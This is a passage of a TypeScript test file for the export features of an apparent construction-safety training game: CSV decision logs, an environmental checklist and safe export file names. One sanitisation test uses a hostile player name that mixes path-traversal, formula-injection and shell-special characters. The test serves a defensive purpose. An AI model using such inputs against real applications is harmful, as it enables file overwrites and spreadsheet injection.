        const step = steps.get(d.stepId)!
        expect(bad[i + 1][7]).toBe(step.options.find((o) => o.id === d.chosenOptionId)!.text)
        expect(bad[i + 1][8]).toBe(step.options.find((o) => o.quality === 'best')!.text)
        expect(bad[i + 1][7]).not.toBe(bad[i + 1][8])
      })
    })
  }

  it('decision log works without the scenario (older callers): same columns, answer wording left blank', () => {
    const state = get(S1.id, 'perfect')
    const rows = parseCsv(decisionsCsv(state))
    expect(rows[0]).toEqual(DECISION_LOG_HEADERS)
    expect(rows[1].slice(0, 3)).toEqual(['Test Group', S1.id, 'Learning'])
    expect(rows[1].slice(7, 9)).toEqual(['', ''])
  })

  it('decision log names the team when a team is playing', () => {
    const state = { ...get(S1.id, 'perfect'), team: { name: 'Team Kestrel', members: ['Priya', 'Tom'], roles: {} } }
    const rows = parseCsv(decisionsCsv(state, S1))
    expect(rows.slice(1).every((r) => r[0] === 'Team Kestrel')).toBe(true)
    // First names of team members are not exported.
    expect(decisionsCsv(state, S1)).not.toMatch(/Priya|Tom\b/)
  })

  it('decision log records a timeout as "timed out", with no chosen answer and no confidence', () => {
    const state = stateFor(S1, 'expert', {}, {}, {
      delegateName: 'Group 2',
      decisions: [{ stepId: 'p5-d1', phaseNumber: 5, prompt: 'Q', topic: 'T', chosenOptionId: 'timeout', quality: 'poor', wasEvent: false, confidence: 'guess', timedOut: true, usedLifeline: true, points: -96 }],
    })
    const model = allDecisionSteps(S1).find((d) => d.id === 'p5-d1')!.options.find((o) => o.quality === 'best')!.text
    expect(parseCsv(decisionsCsv(state, S1))[1]).toEqual([
      'Group 2', S1.title, 'Expert', '5', 'Decision', 'Q', 'T', 'No decision made in time', model, 'timed out', '', 'Yes', '-96',
    ])
  })

  it('decision log shows a tutor question from the wording stored on the record', () => {
    const state = stateFor(S1, 'standard', {}, {}, {
      decisions: [{ stepId: 'custom-7', phaseNumber: 12, prompt: 'Who appoints the principal contractor?', topic: 'Tutor question', chosenOptionId: 'c1', quality: 'poor', wasEvent: false, confidence: 'think', points: -50, custom: true, chosenText: 'The HSE', bestText: 'The client' }],
    })
    const row = parseCsv(decisionsCsv(state, S1))[1]
    expect(row.slice(7, 10)).toEqual(['The HSE', 'The client', 'poor'])
  })

  it('nothing about the timing access setting is exported', () => {
    // Untimed or extended play is never recorded: the log has no time, timer or allowance column.
    expect(DECISION_LOG_HEADERS.join(' ')).not.toMatch(/time|timer|extended|access/i)
    const csv = decisionsCsv(get(S1.id, 'perfect'), S1)
    expect(csv).not.toMatch(/untimed|extended time|timeFrac/i)
  })

  it('environmental checklist only lists environmental topics, with a status per decision', () => {
    const state = stateFor(S1, 'standard', {}, {}, {
      decisions: [
        { stepId: 'a', phaseNumber: 11, prompt: 'Washout', topic: 'Environment — pollution prevention', chosenOptionId: 'x', quality: 'best', wasEvent: false },
        { stepId: 'b', phaseNumber: 11, prompt: 'Skip', topic: 'Waste duty of care', chosenOptionId: 'x', quality: 'partial', wasEvent: false },
        { stepId: 'c', phaseNumber: 11, prompt: 'Cutting', topic: 'Dust and noise', chosenOptionId: 'x', quality: 'unsafe', wasEvent: false },
        { stepId: 'd', phaseNumber: 2, prompt: 'F10', topic: 'CDM 2015 — notification', chosenOptionId: 'x', quality: 'unsafe', wasEvent: false },
      ],
    })
    expect(parseCsv(environmentalChecklistCsv(state, S1))).toEqual([
      ['Environmental topic', 'Situation', 'Status'],
      ['Environment — pollution prevention', 'Washout', 'Controlled'],
      ['Waste duty of care', 'Skip', 'Partially controlled'],
      ['Dust and noise', 'Cutting', 'NOT controlled'],
    ])
  })

  for (const scenario of SCENARIOS) {
    it(`${scenario.id}: the environmental checklist follows the Environmental Control marks (edu-s2-environment-14, edu-s3-environment-13)`, () => {
      const steps = new Map(allDecisionSteps(scenario).map((d) => [d.id, d]))
      const marked = (id: string) => {
        const step = steps.get(id)!
        return (step.options.find((o) => o.quality === 'best')!.impact.environment ?? 0) > 0 || step.options.some((o) => (o.impact.environment ?? 0) < 0)
      }
      const state = get(scenario.id, 'reckless')
      const listed = environmentalDecisions(state, scenario)
      expect(listed.map((d) => d.stepId)).toEqual(state.decisions.filter((d) => marked(d.stepId)).map((d) => d.stepId))
      expect(listed.length).toBeGreaterThan(0)
      // The CSV and the list the screen should use are the same rows.
      expect(parseCsv(environmentalChecklistCsv(state, scenario)).slice(1).map((r) => r[0])).toEqual(listed.map((d) => d.topic))
      // Every poor or unsafe answer on the checklist is also an environmental failure in the Missed Items report.
      const failures = buildMissedItems(state, scenario).environmentalFailures
      for (const d of listed.filter((x) => x.quality === 'poor' || x.quality === 'unsafe')) expect(failures).toContain(steps.get(d.stepId)!.topic)
    })
  }

  it('exports for a game that has not started are header-only, not an exception', () => {
    const blank = stateFor(S1, 'standard')
    for (const d of DIFFS) expect(decisionsCsv({ ...blank, game: { ...blank.game, difficulty: d } })).toBe(DECISION_LOG_HEADERS.join(','))
    expect(parseCsv(permitTrackerCsv(blank, S1)).slice(1).every((r) => r[2] === 'No')).toBe(true)
  })
})

describe('exportName / downloadText (eng-reports-privacy-12)', () => {
  afterEach(() => {
    vi.unstubAllGlobals()
    vi.useRealTimers()
  })

  it('names a file by who played, the scenario, the date and the kind of export', () => {
    const state = stateFor(S1, 'standard', {}, {}, { delegateName: 'Group 3 / Aisha & Tom', finishedAt: '2026-03-02T09:00:00.000Z' })
    expect(exportName(state, S1, 'decision-log')).toBe(`group-3-aisha-tom_${S1.id}_2026-03-02_decision-log.csv`)
    expect(exportName({ ...state, team: { name: 'Team Kestrel', members: [], roles: {} } }, S1, 'Permit tracker')).toBe(`team-kestrel_${S1.id}_2026-03-02_permit-tracker.csv`)
    expect(exportName(state, S1, 'score-report', 'txt')).toMatch(/_score-report\.txt$/)
  })

  it('is always a safe file name: no path, quote or formula characters, and a fallback when the name is empty', () => {
    const hostile = stateFor(S1, 'standard', {}, {}, { delegateName: '=../..\\"<evil>|name?*', startedAt: '2026-01-05T10:00:00.000Z' })
    const name = exportName(hostile, S1, '../x')
    expect(name).toMatch(/^[a-z0-9_-]+\.csv$/)
    expect(name).toBe(`evil-name_${S1.id}_2026-01-05_x.csv`)
    expect(exportName(stateFor(S1, 'standard', {}, {}, { delegateName: '', startedAt: '2026-01-05T10:00:00.000Z' }), null, '')).toBe('delegate_2026-01-05_export.csv')
  })

  it('downloads a CSV with a UTF-8 byte-order mark so Excel shows "—" and "£" correctly, and frees the URL afterwards', async () => {
    vi.useFakeTimers()
    const blobs: Blob[] = []
    const revoke = vi.fn()
    const click = vi.fn()
    const anchor = { href: '', download: '', click, remove: vi.fn() }
    vi.stubGlobal('URL', { createObjectURL: (b: Blob) => { blobs.push(b); return 'blob:fixture' }, revokeObjectURL: revoke })
    vi.stubGlobal('document', { createElement: () => anchor, body: { appendChild: vi.fn() } })

    downloadText('log.csv', 'Item,Value\r\nHoarding — £1.4m,1')
    expect(anchor).toMatchObject({ href: 'blob:fixture', download: 'log.csv' })
    expect(click).toHaveBeenCalledTimes(1)
    const bytes = new Uint8Array(await blobs[0].arrayBuffer())
    expect([...bytes.slice(0, 3)]).toEqual([0xef, 0xbb, 0xbf])
    expect(new TextDecoder().decode(bytes.slice(3))).toBe('Item,Value\r\nHoarding — £1.4m,1')
    // Revoking in the same tick cancels the download in some browsers.
    expect(revoke).not.toHaveBeenCalled()
    vi.advanceTimersByTime(1000)
    expect(revoke).toHaveBeenCalledWith('blob:fixture')

    // No second mark when the text already has one; none at all for a non-CSV download.
    downloadText('again.csv', '\uFEFFa,b')
    expect([...new Uint8Array(await blobs[1].arrayBuffer())]).toEqual([0xef, 0xbb, 0xbf, ...new TextEncoder().encode('a,b')])
    downloadText('notes.txt', 'plain', 'text/plain;charset=utf-8')
    expect([...new Uint8Array(await blobs[2].arrayBuffer())]).toEqual([...new TextEncoder().encode('plain')])
  })
})

// zeroScores is imported so a refactor that drops it from the public surface is noticed here.
it('zeroScores covers exactly the seven categories', () => {
  expect(Object.keys(zeroScores())).toEqual(SCORE_KEYS)
})
